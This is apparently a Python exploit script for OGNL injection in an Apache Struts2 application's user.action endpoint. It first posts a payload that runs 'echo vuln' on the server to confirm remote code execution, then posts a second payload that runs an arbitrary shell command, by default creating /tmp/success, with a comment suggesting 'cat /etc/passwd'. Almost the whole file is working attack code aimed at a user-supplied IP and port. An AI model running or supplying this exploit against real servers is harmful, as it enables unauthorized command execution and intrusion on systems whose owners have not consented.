import argparse
import random
import re
import urllib.parse

import requests
from lib import base_def
from bs4 import BeautifulSoup


def target_test(url, payloads, proxies, headers):
    response = requests.post(url=url, data=payloads, proxies=proxies, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    print(response.url)
    if response.status_code == 200:
        if soup.find_all(string=re.compile('[vuln]')):
            print("vuln has been found!")
            return True
        else:
            print("vuln has not been found!")
            return False
    else:
        print("page has not been found!")
        return False


def target_attack(url, payloads, proxies, headers):
    response = requests.post(url=url, data=payloads, proxies=proxies, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    if response.status_code == 200:
        print(response.url)
        print("vuln has been attacked!")
    else:
        print("Something went wrong with the attack")


if __name__ == '__main__':
    #-------------脚本初始化部分--------------------
    arg_parser = argparse.ArgumentParser()
    print("the scripts has 2 parameters")
    argparse = base_def.start_help(arg_parser)
    proxies = base_def.default_proxies()
    header = base_def.default_header()
    #根据exp，如果命令是带空格的，就需要将shell_command的字符串变成数组：["cat","/etc/passwd"]
    shell_command = str(("touch /tmp/success".split(" "))).replace("[", "{").replace("]", "}")
    #--------------------------------------------

    url = "http://" + argparse.ip + ":" + argparse.port + "/user.action"
    payloads_test = "name=" + urllib.parse.quote(
        "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"echo\", \"vuln\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}")
    payloads_attack = "name=" + urllib.parse.quote("%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]" + shell_command + ")).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}")

    if target_test(url, payloads_test, proxies, header):
        target_attack(url, payloads_attack, proxies, header)
